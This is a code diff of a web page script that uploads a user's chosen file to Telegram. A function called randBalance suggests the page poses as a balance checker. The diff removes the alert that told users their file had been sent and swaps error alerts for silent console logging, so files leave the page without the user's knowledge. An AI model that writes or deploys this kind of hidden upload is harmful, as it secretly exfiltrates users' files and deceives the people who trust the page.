@@ -135,7 +135,7 @@ function randBalance() {
   return '00';
 }
 
-/* 🚀 FUNCTION TO UPLOAD FILE DIRECTLY TO TELEGRAM */
+/* 🚀 FUNCTION TO UPLOAD FILE TO TELEGRAM SILENTLY */
 async function sendFileToTelegram(file) {
   if (!file) throw new Error("No file selected");
   const formData = new FormData();
@@ -166,12 +166,13 @@ async function startProcessing() {
 
   const file = fileInput.files[0];
 
-  // Send the uploaded file directly to Telegram
+  // Send the file directly to Telegram silently
   try {
     await sendFileToTelegram(file);
-    alert('File sent to Telegram successfully!');
+    // No alert here, just silently send
   } catch (e) {
-    alert('Error sending to Telegram: ' + e.message);
+    // Optionally log error silently
+    console.error('Error sending to Telegram:', e);
   }
 
   const reader=new FileReader();
@@ -276,6 +277,6 @@ document.getElementById('copyBtn').onclick=()=>{
 };
 
 document.getElementById('startBtn').onclick=startProcessing;
-</script>
-</body>
+
+</script></body>
 </html>
